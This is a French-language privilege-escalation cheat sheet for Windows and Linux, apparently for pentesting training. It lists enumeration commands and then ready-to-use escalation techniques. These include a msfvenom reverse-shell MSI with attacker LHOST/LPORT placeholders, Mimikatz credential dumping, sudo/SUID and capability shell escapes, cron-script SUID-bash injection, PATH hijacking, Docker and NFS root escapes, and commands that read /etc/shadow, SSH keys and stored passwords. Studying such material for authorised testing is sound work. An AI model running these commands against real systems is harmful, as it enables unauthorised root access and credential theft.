# Guide Escalation de Privilèges

## Table des matières
1. [Concepts de base](#concepts-de-base)
2. [Énumération Windows](#énumération-windows)
3. [Techniques d'escalation Windows](#techniques-descalation-windows)
4. [Énumération Linux](#énumération-linux)
5. [Techniques d'escalation Linux](#techniques-descalation-linux)
6. [Outils automatisés](#outils-automatisés)

---

## Concepts de base

### C'est quoi l'escalation de privilèges ?

```
┌─────────────────────────────────────────────────────────────┐
│            ESCALATION DE PRIVILÈGES                          │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  Accès initial                                              │
│  (user normal)                                              │
│       │                                                      │
│       ▼                                                      │
│  ┌─────────────────────────────────────────┐                │
│  │         PRIVESC                          │                │
│  │  - Misconfigurations                    │                │
│  │  - Vulnérabilités                       │                │
│  │  - Credentials exposés                  │                │
│  │  - Tokens/Permissions                   │                │
│  └─────────────────────────────────────────┘                │
│       │                                                      │
│       ▼                                                      │
│  Accès SYSTEM/root                                          │
│  (contrôle total)                                           │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### Types d'escalation

| Type | Description | Exemple |
|------|-------------|---------|
| **Verticale** | User → Admin/SYSTEM | exploit kernel, token |
| **Horizontale** | User A → User B | accès fichiers d'un autre user |

---

## Énumération Windows

### Commandes de base

```powershell
# === INFORMATIONS SYSTÈME ===
systeminfo                           # OS, patches, architecture
hostname                             # nom de la machine
whoami /all                          # user, groupes, privilèges

# === UTILISATEURS & GROUPES ===
net users                            # liste des users locaux
net localgroup administrators        # membres du groupe admin
net user <username>                  # détails d'un user

# === RÉSEAU ===
ipconfig /all                        # config réseau
netstat -ano                         # connexions actives + PID
arp -a                               # table ARP

# === PROCESSUS & SERVICES ===
tasklist /v                          # processus + details
sc query                             # services
wmic service get name,pathname       # chemins des services

# === FICHIERS INTÉRESSANTS ===
dir /s *password* 2>nul              # fichiers avec "password"
findstr /si password *.txt *.xml     # cherche "password" dans fichiers
```

### Informations à chercher

```
┌─────────────────────────────────────────────────────────────┐
│           CHECKLIST ÉNUMÉRATION WINDOWS                      │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  [ ] Version OS et patches manquants                        │
│  [ ] Privilèges du user actuel (SeImpersonate, etc.)        │
│  [ ] Services avec chemins non-quotés                       │
│  [ ] Services modifiables                                   │
│  [ ] Scheduled tasks modifiables                            │
│  [ ] AlwaysInstallElevated activé ?                         │
│  [ ] Credentials en clair (fichiers, registry, mémoire)     │
│  [ ] Permissions sur fichiers/dossiers sensibles            │
│  [ ] Applications vulnérables installées                    │
│  [ ] Historique PowerShell                                  │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

---

## Techniques d'escalation Windows

### 1. Token Impersonation (Potato attacks)

Si tu as **SeImpersonatePrivilege** ou **SeAssignPrimaryTokenPrivilege** :

```
┌─────────────────────────────────────────────────────────────┐
│              TOKEN IMPERSONATION                             │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  whoami /priv                                               │
│  → SeImpersonatePrivilege = ENABLED                         │
│                                                              │
│  Comment ça marche:                                         │
│  1. On force un service SYSTEM à se connecter à nous        │
│  2. On vole son token d'authentification                    │
│  3. On crée un process avec ce token                        │
│                                                              │
│  Outils:                                                    │
│  - JuicyPotato                                              │
│  - PrintSpoofer                                             │
│  - RoguePotato                                              │
│  - SweetPotato                                              │
│  - GodPotato                                                │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

**Exemple avec PrintSpoofer :**
```cmd
PrintSpoofer.exe -i -c "cmd /c whoami"
# Résultat: nt authority\system
```

### 2. Unquoted Service Paths

Si un service a un chemin sans guillemets avec des espaces :

```
┌─────────────────────────────────────────────────────────────┐
│              UNQUOTED SERVICE PATH                           │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  Chemin vulnérable:                                         │
│  C:\Program Files\Vulnerable App\service.exe                │
│                                                              │
│  Windows cherche dans cet ordre:                            │
│  1. C:\Program.exe                                          │
│  2. C:\Program Files\Vulnerable.exe   ◄── On place ici     │
│  3. C:\Program Files\Vulnerable App\service.exe             │
│                                                              │
│  Exploitation:                                              │
│  1. Vérifier qu'on peut écrire dans C:\Program Files\       │
│  2. Placer notre exe malveillant: Vulnerable.exe            │
│  3. Redémarrer le service (ou attendre reboot)              │
│  4. Notre code s'exécute en tant que SYSTEM                 │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

**Détecter :**
```cmd
wmic service get name,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

### 3. Service Binary Hijacking

Si tu peux modifier le binaire d'un service :

```cmd
# Trouver les services modifiables
accesschk.exe -uwcqv "Users" * /accepteula

# Remplacer le binaire
sc qc <service>
copy malicious.exe "C:\path\to\service.exe"
sc stop <service>
sc start <service>
```

### 4. DLL Hijacking

```
┌─────────────────────────────────────────────────────────────┐
│                 DLL HIJACKING                                │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  Ordre de recherche DLL:                                    │
│  1. Dossier de l'application                                │
│  2. C:\Windows\System32                                     │
│  3. C:\Windows\System                                       │
│  4. C:\Windows                                              │
│  5. Répertoire courant                                      │
│  6. Dossiers dans PATH                                      │
│                                                              │
│  Si une DLL n'existe pas dans les priorités hautes,        │
│  on peut placer notre DLL malveillante !                    │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

**Trouver les DLL manquantes :**
```cmd
# Utiliser Process Monitor (Sysinternals)
# Filtrer: Result = NAME NOT FOUND, Path ends with .dll
```

### 5. AlwaysInstallElevated

Si activé, les MSI s'installent en SYSTEM :

```cmd
# Vérifier
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Si les deux = 1, exploiter:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o malicious.msi
msiexec /quiet /qn /i malicious.msi
```

### 6. Credentials en clair

```powershell
# === FICHIERS ===
# SAM et SYSTEM (si accessibles)
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM

# Fichiers de config
C:\inetpub\wwwroot\web.config
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattended.xml

# === REGISTRY ===
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# === MÉMOIRE (avec Mimikatz) ===
sekurlsa::logonpasswords
```

### 7. Scheduled Tasks

```cmd
# Lister les tâches
schtasks /query /fo LIST /v

# Chercher des scripts modifiables
# Si une tâche exécute un script que tu peux modifier → pwned
```

### 8. UAC Bypass

```
┌─────────────────────────────────────────────────────────────┐
│                  UAC BYPASS                                  │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  - Fodhelper bypass                                         │
│  - Eventvwr bypass                                          │
│  - ComputerDefaults bypass                                  │
│  - CMSTP bypass                                             │
│                                                              │
│  Vérifie le niveau UAC:                                     │
│  reg query HKLM\Software\Microsoft\Windows\CurrentVersion\  │
│            Policies\System /v ConsentPromptBehaviorAdmin    │
│                                                              │
│  0 = Pas de prompt (UAC désactivé)                          │
│  1 = Prompt pour consent sur secure desktop                 │
│  2 = Prompt pour credentials sur secure desktop             │
│  3 = Prompt pour consent                                    │
│  4 = Prompt pour credentials                                │
│  5 = Prompt pour consent pour non-Windows binaries          │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

---

## Énumération Linux

### Commandes de base

```bash
# === INFORMATIONS SYSTÈME ===
uname -a                              # kernel version
cat /etc/os-release                   # distribution
hostname                              # nom machine

# === UTILISATEURS ===
id                                    # user actuel + groupes
whoami                                # username
cat /etc/passwd                       # tous les users
cat /etc/shadow                       # hashes (si lisible!)
sudo -l                               # commandes sudo autorisées

# === RÉSEAU ===
ip a                                  # interfaces
netstat -tulpn                        # ports en écoute
ss -tulpn                             # alternative moderne

# === PROCESSUS ===
ps aux                                # tous les processus
top                                   # processus temps réel

# === FICHIERS SUID/SGID ===
find / -perm -u=s -type f 2>/dev/null # SUID
find / -perm -g=s -type f 2>/dev/null # SGID

# === CAPABILITIES ===
getcap -r / 2>/dev/null

# === CRON JOBS ===
cat /etc/crontab
ls -la /etc/cron.*
```

### Checklist énumération Linux

```
┌─────────────────────────────────────────────────────────────┐
│           CHECKLIST ÉNUMÉRATION LINUX                        │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  [ ] Version kernel (exploits publics ?)                    │
│  [ ] sudo -l (commandes sans password ?)                    │
│  [ ] Binaires SUID/SGID exploitables                        │
│  [ ] Capabilities sur binaires                              │
│  [ ] Cron jobs avec scripts modifiables                     │
│  [ ] Fichiers avec permissions faibles                      │
│  [ ] Services qui tournent en root                          │
│  [ ] Credentials dans fichiers/historique                   │
│  [ ] SSH keys accessibles                                   │
│  [ ] NFS avec no_root_squash                                │
│  [ ] Docker/LXC mal configuré                               │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

---

## Techniques d'escalation Linux

### 1. Sudo misconfiguration

```bash
# Vérifier
sudo -l

# Si (ALL) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/bash'

# Si (ALL) NOPASSWD: /usr/bin/find
sudo find / -exec /bin/bash \;

# Si (ALL) NOPASSWD: /usr/bin/python
sudo python -c 'import os; os.system("/bin/bash")'
```

**Référence :** [GTFOBins](https://gtfobins.github.io/)

### 2. SUID Binaries

```bash
# Trouver les SUID
find / -perm -4000 -type f 2>/dev/null

# Exploiter (exemple avec /usr/bin/find)
/usr/bin/find . -exec /bin/sh -p \;

# Exemples SUID exploitables:
# - nmap (anciennes versions)
# - vim
# - less
# - bash
# - python
# - perl
```

### 3. Capabilities

```bash
# Trouver les caps
getcap -r / 2>/dev/null

# Si python a cap_setuid+ep:
python -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Si /usr/bin/tar a cap_dac_read_search:
tar -cvf shadow.tar /etc/shadow
tar -xvf shadow.tar
# Puis crack les hashes
```

### 4. Cron Jobs

```bash
# Voir les cron jobs
cat /etc/crontab
ls -la /var/spool/cron/crontabs/

# Si un script est exécuté par root et modifiable:
echo 'chmod +s /bin/bash' >> /path/to/script.sh
# Attendre l'exécution du cron
/bin/bash -p
```

### 5. PATH Hijacking

```bash
# Si un script root utilise une commande sans chemin absolu:
# Exemple: script.sh contient `cat /etc/shadow`

# Créer un faux "cat"
echo '/bin/bash' > /tmp/cat
chmod +x /tmp/cat
export PATH=/tmp:$PATH

# Exécuter le script vulnérable
```

### 6. Kernel Exploits

```bash
# Vérifier la version
uname -r

# Chercher des exploits
# - searchsploit linux kernel <version>
# - Google "linux <version> privilege escalation"

# Exemples célèbres:
# - Dirty COW (CVE-2016-5195)
# - Dirty Pipe (CVE-2022-0847)
# - Polkit (CVE-2021-4034)
```

### 7. Docker Escape

```bash
# Si tu es dans le groupe docker:
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Si privileged container:
mount /dev/sda1 /mnt
chroot /mnt
```

### 8. NFS no_root_squash

```bash
# Sur la machine cible, vérifier les exports
cat /etc/exports
# Si no_root_squash est présent:

# Sur ta machine (en root):
mkdir /tmp/nfs
mount -t nfs <IP>:/share /tmp/nfs
cp /bin/bash /tmp/nfs/
chmod +s /tmp/nfs/bash

# Sur la cible:
/share/bash -p
```

### 9. Credentials leakées

```bash
# Historique
cat ~/.bash_history
cat ~/.mysql_history

# Fichiers de config
cat ~/.ssh/id_rsa
cat /var/www/html/config.php
cat /etc/mysql/debian.cnf

# Variables d'environnement
env | grep -i pass
```

---

## Outils automatisés

### Windows

| Outil | Description | Lien |
|-------|-------------|------|
| **WinPEAS** | Énumération complète | [GitHub](https://github.com/carlospolop/PEASS-ng) |
| **PowerUp** | PowerShell privesc | [GitHub](https://github.com/PowerShellMafia/PowerSploit) |
| **Seatbelt** | Énumération C# | [GitHub](https://github.com/GhostPack/Seatbelt) |
| **Watson** | Patches manquants | [GitHub](https://github.com/rasta-mouse/Watson) |

### Linux

| Outil | Description | Lien |
|-------|-------------|------|
| **LinPEAS** | Énumération complète | [GitHub](https://github.com/carlospolop/PEASS-ng) |
| **LinEnum** | Énumération legacy | [GitHub](https://github.com/rebootuser/LinEnum) |
| **pspy** | Surveille les processus | [GitHub](https://github.com/DominicBreuker/pspy) |
| **linux-exploit-suggester** | Suggère kernel exploits | [GitHub](https://github.com/mzet-/linux-exploit-suggester) |

---

## Résumé rapide

### Windows - Top techniques

| Technique | Condition requise |
|-----------|-------------------|
| Potato attacks | SeImpersonatePrivilege |
| Unquoted paths | Service mal configuré |
| AlwaysInstallElevated | Registry activée |
| Token theft | Accès à process privilégié |
| Mimikatz | Accès à LSASS |

### Linux - Top techniques

| Technique | Condition requise |
|-----------|-------------------|
| sudo -l | Commande mal configurée |
| SUID binaries | Binaire exploitable |
| Capabilities | Cap mal assignée |
| Cron jobs | Script modifiable |
| Kernel exploit | Version vulnérable |

---

## Ressources

- **HackTricks** : https://book.hacktricks.xyz/
- **GTFOBins** : https://gtfobins.github.io/
- **LOLBAS** : https://lolbas-project.github.io/
- **PayloadsAllTheThings** : https://github.com/swisskyrepo/PayloadsAllTheThings
